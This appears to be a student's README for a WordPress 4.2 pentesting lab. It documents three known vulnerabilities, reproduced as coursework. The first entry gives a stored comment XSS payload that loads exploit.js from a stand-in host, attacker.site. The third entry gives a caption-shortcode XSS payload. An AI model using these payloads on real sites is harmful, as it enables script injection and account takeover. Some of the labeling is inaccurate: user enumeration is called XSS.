# Week7CyberSecurity

# Project 7 - WordPress Pentesting

Time spent: **X** hours spent in total
Started:  03:10pm 4/10/18 stopped at 10:00PM 4/10/18
Started:  01:50pm 4/11:18 stopped at 03:20PM 4/11/18

TOTAL TIME: 8 1/2 Hours

> Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress

## Pentesting Report

1. Vulnerability 7945
  - [ ] Summary: 
    - Vulnerability types: XSS
    - Tested in version: 4.2
    - Fixed in version: 4.2.1
  - [ ] GIF Walkthrough: REFER TO FirstExploit
  - [ ] Steps to recreate:
  I went to a location where I could leave a comment then pasted <a title='xxx onmouseover=eval(unescape(/var%20a%3Ddocument.createElement%28%27script%27%29%3Ba.setAttribute%28%27src%27%2C%27https%3A%2f%2fattacker.site%2fexploit.js%27%29%3Bdocument.head.appendChild%28a%29/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>
and I went to http://bytesizematters.com/ and typed out more than 64KB of the character "A", Then I copied it and pasted it 
into the Comment box afterwards I posted the comment. Sign into admin and viewed Network tab under developer tools for exploit
  - [ ] Affected source code:
    - [Link 1](https://klikki.fi/adv/wordpress2.html)

1.  Vulnerability User Enumeration
  - [ ] Summary: 
    - Vulnerability types: XSS
    - Tested in version: 4.2
    - Fixed in version: Not Specified
  - [ ] GIF Walkthrough:  REFER TO SecondExploit
  - [ ] Steps to recreate: Whenever the attacker is at the login screen, they can time is and series of names and a password incoreect or not and Wordpress will state whether or not the user exists
  - [ ] Affected source code:
    - [Link 2](https://dev-notes.eu/2016/09/preventing-user-enumeration-in-wordpress/)

1. Vulnerability 8111
  - [ ] Summary: 
    - Vulnerability types: XSS
    - Tested in version: 4.2
    - Fixed in version: 4.2.3
  - [ ] GIF Walkthrough: REFER TO ThirdExploit
  - [ ] Steps to recreate: Using an Author/Contributor level account paste <a href="[caption code=">]</a><a title=" onmouseover=alert('test')  ">link</a> in HTML edit mode in a post submit it and when the admin logs in and hovers over the link you her a pop up.
  - [ ] Affected source code:
    - [Link 3](https://klikki.fi/adv/wordpress3.html)

List any additional assets, such as scripts or files

## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with [LiceCap](http://www.cockos.com/licecap/).

## Notes

Physically installing the application was a challenge. Next is using WordPress for the first time.
## License

    Copyright [yyyy] [name of copyright owner]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
